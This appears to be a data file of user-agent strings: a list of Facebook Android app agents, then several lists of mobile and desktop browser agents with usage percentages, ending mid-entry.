    'Dalvik\\/2.1.0 (Linux; U; Android 9; Redmi Note 7 MIUI\\/V10.3.6.0.PFGEUXM) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/182747450;FBCR\\/MASMOVIL;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 7;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 6.0.1; D6503 Build\\/23.5.A.1.291) [FBAN\\/Orca-Android;FBAV\\/139.0.0.17.85;FBPN\\/com.facebook.orca;FBLC\\/in_ID;FBBV\\/74871072;FBCR\\/Far EasTone;FBMF\\/Sony;FBBD\\/Sony;FBDV\\/D6503;FBSV\\/6.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1776};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g go Build\\/RRHG31.Q3-37-43-43-5-4) [FBAN\\/FB4A;FBAV\\/386.0.0.35.108;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/402949595;FBCR\\/AT&amp;amp-T;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g go;FBSV\\/11;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1504};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build\\/R16NW) [FBAN\\/FB4A;FBAV\\/187.0.0.43.81;FBPN\\/com.facebook.katana;FBLC\\/fr_FR;FBBV\\/122388438;FBCR\\/Bouygues Telecom;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G930F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,h',
    'Dalvik\\/2.1.0 (Linux; U; Android 9.0; SM-A40s&#039;20&#039; Build\\/LMY47I) [FBAN\\/AudienceNetworkForAndroid;FBSN\\/Android;FBSV\\/9.0;FBAB\\/com.playit.videoplayer;FBAV\\/2.4.9.22; FBBV\\/20409022;FBVS\\/5.9.0;FBLC\\/in_ID]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; moto e(7) plus Build\\/QPZS30.30-Q3-38-69-12) [FBAN\\/FB4A;FBAV\\/407.0.0.30.97;FBPN\\/com.facebook.katana;FBLC\\/es_US;FBBV\\/458543257;FBCR\\/AT&amp;amp-T;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e(7) plus;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1515};FB_FW\\/1;FBRV\\/460183955;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; Pixel 6a Build\\/TQ2A.230505.002) [FBAN\\/Orca-Android;FBAV\\/406.0.0.13.115;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/470794982;FBCR\\/Google Fi;FBMF\\/Google;FBBD\\/google;FBDV\\/Pixel',
    'Dalvik\\/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN\\/MobileAdsManagerAndroid;FBAV\\/324.0.0.28.115;FBBV\\/464692125;FBRV\\/0;FBPN\\/com.facebook.adsmanager;FBLC\\/en_US;FBMF\\/POCOPHONE;FBBF\\/Poco;FBDV\\/Poco F1;FBSV\\/10;FBCA\\/arm64-v8a:armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1424};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build\\/N2G48H) [FBAN\\/FB4A;FBAV\\/382.0.0.33.111;FBPN\\/com.facebook.katana;FBLC\\/zh_CN;FBBV\\/394408512;FBCR\\/EE;FBMF\\/Asus;FBBD\\/Asus;FBDV\\/ASUS_Z01QD;FBSV\\/7.1.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=800,height=1280};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build\\/O11019) [FBAN\\/FB4A;FBAV\\/382.0.0.33.111;FBPN\\/com.facebook.katana;FBLC\\/km_KH;FBBV\\/394408901;FBCR\\/Metfone;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1909;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1424};FB_FW\\/1;FBRV\\/396611140;]',
    'dalvik\\/ 2.1.0 (linux; u, Android 13 SM-A326B build\\/ TP1A.220624.014) [FBAN\\/Orca-_FBAN\\/FB4A;FBAV\\/420.0.0.32.61;FBBV\\/486988352;FBDM42-29',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build\\/GT-I5508) [FBAN\\/FB4A;FBAV\\/409.0.0.13.251;FBBV\\/349036431;FBDM\\/{density=2.0,width=720,height=1280};FBLC\\/en_US;FBRV\\/349036431;FBCR\\/Movistar;FBMF\\/samsung;FBBD\\/samsung;FBPN\\/com.facebook.orca;FBDV\\/MMB29K;FBSV\\/7.0.0;FBOP\\/1;FBCA\\/armeabi-v7a:armeabi;FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0.0; GT-N7105 Build\\/GT-7320) [FBAN\\/FB4A;FBAV\\/133.0.0.48.536;FBBV\\/137289708;FBDM\\/{density=2.0,width=720,height=1280};FBLC\\/en_US;FBRV\\/137289708;FBCR\\/Movistar;FBMF\\/samsung;FBBD\\/samsung;FBPN\\/com.facebook.orca;FBDV\\/GT-N7105;FBSV\\/7.0.0;FBOP\\/1;FBCA\\/armeabi-v7a:armeabi;FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux\\; U\\; Android 11\\; SM-N975F Build\\/RP1A.200720.012) [FBAN\\/AudienceNetworkForAndroid\\;FBSN\\/Android\\;FBSV\\/11\\;FBAB\\/com.antutu.ABenchMark\\;FBAV\\/8.2.4\\;FBBV\\/8020400\\;FBVS\\/5.6.0\\;FBLC\\/ru_RU]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; VIA P3Dalvik\\/2.1.0 (Linux; U; Android 9; VIA_P3 Build\\/PPR1.180610.011) [FBAN\\/FB4A;FBAV\\/417.0.0.33.65;FBPN\\/com.facebook.katana;FBLC\\/tr_TR;FBBV\\/480085463;FBCR\\/Turk Telekom;FBMF\\/Casper;FBBD\\/Casper;FBDV\\/VIA_P3;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1360};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-S901U Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/421.0.0.12.61;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/502432091;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-S901U;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2115};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; F1w Build\\/LMY47V) [FBAN\\/FB4A;FBAV\\/94.0.0.17.68;FBPN\\/com.facebook.katana;FBLC\\/vi_VN;FBBV\\/38831839;FBCR\\/VINAPHONE;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/F1w;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1280};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; TECNO KI5k Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/377.0.0.13.101;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/396116327;FBCR\\/LoneStar;FBMF\\/TECNO;FBBD\\/TECNO;FBDV\\/TECNO KI5k;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1444};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A217F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/422.0.0.18.107;FBPN\\/com.facebook.orca;FBLC\\/pt_PT;FBBV\\/505323569;FBCR\\/Unitel STP;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A217F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1532};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; M5 Note Build\\/NRD90M) [FBAN\\/FB4A;FBAV\\/292.0.0.61.123;FBPN\\/com.facebook.katana;FBLC\\/ru_RU;FBBV\\/251145728;FBCR\\/MegaFon;FBMF\\/Meizu;FBBD\\/Meizu;FBDV\\/M5 Note;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; TECNO KI5k Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/377.0.0.13.101;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/396116327;FBCR\\/MTN;FBMF\\/TECNO;FBBD\\/TECNO;FBDV\\/TECNO KI5k;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1444};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-S134DL Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/405.0.0.16.112;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/466674869;FBCR\\/&amp;#160-;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-S134DL;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.875,width=720,height=1465};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1; Dragon Face Build\\/NHG47L) [FBAN\\/FB4A;FBAV\\/343.0.0.37.117;FBPN\\/com.facebook.katana;FBLC\\/ar_EG;FBBV\\/329937443;FBCR\\/null;FBMF\\/Amlogic;FBBD\\/Amlogic;FBDV\\/Dragon Face;FBSV\\/8.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.0,width=1280,height=720};FB_FW\\/1;FBRV\\/332189930;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1; Vowney Build\\/LMY47I) [FBAN\\/Orca-Android;FBAV\\/271.0.0.11.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/227270172;FBCR\\/null;FBMF\\/elephone;FBBD\\/elephone;FBDV\\/Vowney;FBSV\\/5.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2368};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; JKM-LX1 Build\\/HUAWEIJKM-LX1) [FBAN\\/MessengerLite;FBAV\\/273.0.0.16.48;FBPN\\/com.facebook.mlite;FBLC\\/en_US;FBBV\\/325178905;FBCR\\/null;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/JKM-LX1;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2137};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; CPH2385 Build\\/SP1A.210812.016) [FBAN\\/AudienceNetworkForAndroid;FBSN\\/Android;FBSV\\/12;FBAB\\/com.miniclip.realsniper;FBAV\\/500202;FBBV\\/500202;FBVS\\/6.12.0;FBLC\\/en_NZ]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A125F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/384.0.0.18.104;FBPN\\/com.facebook.orca;FBLC\\/lt_LT;FBBV\\/412138691;FBCR\\/Tele2 LT;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A125F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.875,width=720,height=1465};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux\\; U\\; Android 13\\; M2101K7BNY Build\\/TP1A.220624.014) [FBAN\\/AudienceNetworkForAndroid\\;FBSN\\/Android\\;FBSV\\/13\\;FBAB\\/cat.mansion.merge.games\\;FBAV\\/1.06\\;FBBV\\/106\\;FBVS\\/6.14.0\\;FBLC\\/ru_RU]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build\\/S3SGS32.39-181-5) [FBAN\\/Orca-Android;FBAV\\/424.0.0.25.113;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/510343531;FBCR\\/Verizon ;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g play - 2023;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1439};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; M2103K19G Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/416.0.0.9.76;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/491071575;FBCR\\/JAZZTEL;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/M2103K19G;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.375,width=1080,height=2138};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-T835 Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/339015011;FBCR\\/YES OPTUS;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-T835;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.25,width=1600,height=2452};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; Leelbox Build\\/PPR1.281373.396) [FBAN\\/FB4A;FBAV\\/271.0.0.55.109;FBBV\\/215365690;FBDM\\/{density=3.0,width=1080,height=2208};FBLC\\/en_GB;FBRV\\/216077496;FBCR\\/inwi;FBMF\\/OPPO;FBBD\\/OPPO;FBPN\\/com.facebook.katana;FBDV\\/CPH1989;FBSV\\/9;FBOP\\/1;FBCA\\/arm64-v8a:;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; Z6356T Build\\/RP1A.201005.001) [FBAN\\/Orca-Android;FBAV\\/428.0.0.35.115;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/520514255;FBCR\\/Telstra;FBMF\\/ZTE;FBBD\\/ZTE;FBDV\\/Z6356T;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.25,width=720,height=1466};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; Z6356T Build\\/RP1A.201005.001) [FBAN\\/Orca-Android;FBAV\\/428.0.0.35.115;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/520514424;FBCR\\/Telstra;FBMF\\/ZTE;FBBD\\/ZTE;FBDV\\/Z6356T;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1476};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; RNE-L22 Build\\/HUAWEIRNE-L22) [FBAN\\/Orca-Android;FBAV\\/426.0.0.27.102;FBPN\\/com.facebook.orca;FBLC\\/in_ID;FBBV\\/515381945;FBCR\\/Telkomsel;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/RNE-L22;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.75,width=1080,height=2050};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A217F Build\\/SP1A.210812.016) [FBAN\\/AudienceNetworkForAndroid;FBSN\\/Android;FBSV\\/12;FBAB\\/com.miniclip.carrom;FBAV\\/15.2.0;FBBV\\/931;FBVS\\/6.16.0;FBLC\\/en_GB]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13.0; Samsung Galaxy S21 Build\\/OPR1.8610) [FBAN\\/EMA;FBBV\\/470353487;FBAV\\/353.0.0.5.112;FBDV\\/Samsung Galaxy S21;FBLC\\/id_ID;FBNG\\/WIFI;FBMNT\\/METERED;FBDM\\/{density=3.0}]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build\\/RKQ1.201004.002) [FBAN\\/Orca-Android;FBAV\\/433.0.0.32.117;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/532438891;FBCR\\/O2.CZ;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 8T;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-G780G Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/435.0.0.32.108;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/537314828;FBCR\\/VIVO;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G780G;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2168};FB_FW\\/1']
[][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.3',
    'pct': 47.87 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.',
    'pct': 14.89 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.3',
    'pct': 6.91 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
    'pct': 2.13 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.',
    'pct': 2.13 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.6 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.',
    'pct': 1.6 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.3',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.1  Mobile/15E148 Safari/605.1.1',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.',
    'pct': 1.06 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; MED-LX9N; HMSCore 6.12.2.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.2.311 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/293.0.586189917 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M526BR) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/293.0.586189917 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/291.0.582931352 Mobile/15E148 Safari/604.',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G390F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.3',
    'pct': 0.53 }]
[
    {
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.1',
        'pct': 31.5 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3',
        'pct': 17.34 },
    {
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.1',
        'pct': 11.27 },
    {
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1',
        'pct': 9.83 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3',
        'pct': 9.25 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.',
        'pct': 6.94 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.',
        'pct': 2.31 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.',
        'pct': 2.31 },
    {
        'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3',
        'pct': 1.16 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.',
        'pct': 1.16 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.3',
        'pct': 1.16 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0 (Edition beta',
        'pct': 1.16 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Herring/90.1.9310.1',
        'pct': 1.16 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.',
        'pct': 1.16 },
    {
